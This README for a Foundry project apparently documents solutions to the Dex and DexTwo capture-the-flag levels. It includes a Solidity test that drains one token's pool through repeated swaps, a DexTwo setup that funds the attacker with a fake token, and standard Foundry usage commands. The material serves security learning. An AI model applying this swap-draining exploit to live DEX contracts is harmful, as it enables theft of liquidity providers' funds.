# PoC Dex
## Overview:
An attacker can exploit the Dex contract by performing a series of swaps to drain the liquidity of one of the tokens, token1 or token2. 

## Actors:
### Attacker - The attacker make some series of swaps to the DEX to drain the liquidity
### Protocol - The protocol is a DEX that allows two different types of token to be swapped.

### Test Case:

```
function test_multiple_swaps() public {
        vm.startPrank(attacker);
        token1.approve(address(dex), 100);
        token2.approve(address(dex), 100);

        uint256 token1Expected = token1.balanceOf(address(dex));
        dex.swap(address(token1), address(token2), 10);
        dex.swap(address(token2), address(token1), 20);
        dex.swap(address(token1), address(token2), 24);
        dex.swap(address(token2), address(token1), 30);
        dex.swap(address(token1), address(token2), 41);
        dex.swap(address(token2), address(token1), 45);

        uint256 token1Balance = token1.balanceOf(attacker);
        uint256 token1ExpectedAfter = token1.balanceOf(address(dex));

        assert(token1Balance == token1Expected + 10);
        assertEq(token1ExpectedAfter, 0);
    }
```

# PoC DexTwo
## Overview:
An attacker can exploit the Dex contract by performing a series of swaps to drain the liquidity of the two token, token1 & token2. 

## Actors:
### Attacker - The attacker make some series of swaps to the DEX to drain the liquidity of the two tokens
### Protocol - The protocol is a DEX that allows two different types of token to be swapped.

### Test Case:

```
function setUp() public {
        vm.startPrank(owner);
        dex = new DexTwo(owner);

        token1 = new SwappableTokenTwo(address(dex), "Token1", "TK1", 110);
        token2 = new SwappableTokenTwo(address(dex), "Token2", "TK2", 110);

        dex.setTokens(address(token1), address(token2));
        console.log("Owner Token1 Balance before transfer:", token1.balanceOf(owner));

        token1.approve(address(dex), 100);
        token2.approve(address(dex), 100);

        dex.add_liquidity(address(token1), 100);
        dex.add_liquidity(address(token2), 100);
        console.log("Owner Token1 Balance After transfer:", token1.balanceOf(owner));

        // Deploy FakeToken
        fakeToken = new FakeToken(owner, "fakeToken", "MTK", 500);
        fakeToken.transfer(attacker, 400);
    }

```

## Foundry

**Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.**

Foundry consists of:

-   **Forge**: Ethereum testing framework (like Truffle, Hardhat and DappTools).
-   **Cast**: Swiss army knife for interacting with EVM smart contracts, sending transactions and getting chain data.
-   **Anvil**: Local Ethereum node, akin to Ganache, Hardhat Network.
-   **Chisel**: Fast, utilitarian, and verbose solidity REPL.

## Documentation

https://book.getfoundry.sh/

## Usage

### Build

```shell
$ forge build
```

### Test

```shell
$ forge test
```

### Format

```shell
$ forge fmt
```

### Gas Snapshots

```shell
$ forge snapshot
```

### Anvil

```shell
$ anvil
```

### Deploy

```shell
$ forge script script/Counter.s.sol:CounterScript --rpc-url <your_rpc_url> --private-key <your_private_key>
```

### Cast

```shell
$ cast <subcommand>
```

### Help

```shell
$ forge --help
$ anvil --help
$ cast --help
```
